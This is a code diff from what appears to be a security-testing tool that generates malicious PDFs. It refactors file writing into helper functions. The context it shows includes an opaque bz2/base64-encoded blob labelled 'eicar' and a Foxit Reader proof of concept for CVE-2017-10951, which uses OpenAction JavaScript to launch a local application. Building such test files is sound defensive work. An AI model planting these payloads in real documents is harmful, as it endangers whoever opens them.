@@ -22,6 +22,43 @@ import os
 import argparse
 from pathlib import Path
 
+
+def write_pdf_file(filename, content):
+    """Write PDF content to file with proper error handling.
+
+    Args:
+        filename: Path to the output PDF file
+        content: PDF content string to write
+
+    Raises:
+        IOError: If file write operation fails
+    """
+    try:
+        with open(filename, "w") as file:
+            file.write(content)
+    except IOError as e:
+        print(f"[!] Error writing {filename}: {e}")
+        raise
+
+
+def write_pdf_file_binary(filename, content):
+    """Write binary PDF content to file with proper error handling.
+
+    Args:
+        filename: Path to the output PDF file
+        content: Binary PDF content to write
+
+    Raises:
+        IOError: If file write operation fails
+    """
+    try:
+        with open(filename, "wb") as file:
+            file.write(content)
+    except IOError as e:
+        print(f"[!] Error writing {filename}: {e}")
+        raise
+
+
 def validate_url_or_ip_validators(input_string):
   """Validates if input is an IP address or a URL with a scheme."""
 
@@ -53,21 +90,20 @@ def validate_url_or_ip_validators(input_string):
 # Created by Stas Yakobov
 def create_malpdf11(filename):
     eicar = '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'
-    with open(filename, "wb") as file:
-        file.write(bz2.decompress(base64.b64decode(eicar)))
+    write_pdf_file_binary(filename, bz2.decompress(base64.b64decode(eicar)))
 
 # Foxit PDF Reader PoC, macOS version "patch gap" : CVE-2017-10951
-# Source: https://twitter.com/l33d0hyun/status/1448342241647366152 
+# Source: https://twitter.com/l33d0hyun/status/1448342241647366152
 # This sample contains no phone-home
 def create_malpdf10(filename):
-    with open(filename, "w") as file:
-        file.write('''%PDF-1.7
+    content = '''%PDF-1.7
 1 0 obj
 <</Pages 1 0 R /OpenAction 2 0 R>>
 2 0 obj
 <</S /JavaScript /JS (
 this.getURL("file:///System/Applications/Calculator.app")
-)>> trailer <</Root 1 0 R>>''')
+)>> trailer <</Root 1 0 R>>'''
+    write_pdf_file(filename, content)
 
 ## Testcase from 01-testsuite/02-disclosure/01-url-invocation/data-link.pdf
 ## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
